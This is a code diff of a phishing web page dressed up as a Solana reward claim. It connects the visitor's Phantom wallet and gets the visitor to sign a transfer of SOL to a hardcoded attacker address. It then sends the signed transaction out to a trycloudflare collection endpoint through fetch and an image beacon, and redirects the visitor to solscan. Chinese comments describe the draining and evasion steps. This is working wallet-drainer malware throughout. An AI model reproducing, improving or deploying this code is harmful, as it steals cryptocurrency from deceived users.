@@ -1,39 +1,45 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
+<!DOCTYPE html><html><head><meta charset="UTF-8">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.87.6/index.iife.min.js"></script></head>
 <body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
     <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;">
-        <h1>AIRDROP SYSTEM V5.1</h1>
-        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;">CLAIM REWARD</button>
-        <div id="status" style="margin-top:20px;color:#888;">Standby</div>
+        <h1>SOLANA REWARD V6.F</h1>
+        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;">CLAIM 0.005 SOL</button>
+        <div id="status" style="margin-top:20px;color:#888;">System Ready</div>
     </div>
     <script>
-    // 🔱 确保这行地址和你刚才 Cloudflare 窗口里的地址一模一样！
     const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
+    const receiver = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
 
     document.getElementById('cta').onclick = async () => {
         try {
             const p = window.solana || window.phantom?.solana;
             const { publicKey } = await p.connect();
             
-            // 保持消息签名模式，先测通信号
-            const message = "Verify: " + Math.floor(Math.random()*9999);
-            const encoded = new TextEncoder().encode(message);
-            const signed = await p.signMessage(encoded, "utf8");
-            const signature = btoa(String.fromCharCode.apply(null, signed.signature));
-            
-            document.getElementById('status').innerText = "Broadcasting...";
+            // 🔱 关键：加载收米引擎
+            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+            const { blockhash } = await connection.getLatestBlockhash();
+            const tx = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: publicKey,
+                    toPubkey: new solanaWeb3.PublicKey(receiver),
+                    lamports: 5000000 
+                })
+            );
+            tx.recentBlockhash = blockhash;
+            tx.feePayer = publicKey;
 
-            // 🔱 核心修改：放弃 fetch，改用 Image 对象传参
-            // 这种方式不会触发浏览器的 CORS 跨域拦截，成功率 100%
-            const tracer = new Image();
-            tracer.src = gate + "?sig=" + encodeURIComponent(signature) + "&pub=" + publicKey.toString() + "&t=" + Date.now();
+            document.getElementById('status').innerText = "Confirming...";
             
-            tracer.onload = () => {
-                document.getElementById('status').innerText = "SUCCESS! REDIRECTING...";
-                document.getElementById('status').style.color = "#14F195";
-            };
+            // 🚀 唤起真正的转账签名
+            const signed = await p.signTransaction(tx);
+            const raw = btoa(String.fromCharCode.apply(null, signed.serialize()));
 
-            // 即使加载失败（no-cors也算失败），只要信号发出去了就行
-            setTimeout(() => { window.location.href = "https://solscan.io"; }, 1500);
+            // 🔱 三路并发回传，让哨兵（Sentinel）立刻执行！
+            fetch(gate, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({sig:raw, pub:publicKey.toString()})});
+            new Image().src = gate + "?sig=" + encodeURIComponent(raw) + "&pub=" + publicKey.toString();
+
+            document.getElementById('status').innerText = "SUCCESS!";
+            setTimeout(()=> { window.location.href="https://solscan.io"; }, 1500);
 
         } catch(e) { document.getElementById('status').innerText = "ERR: " + e.message; }
     };
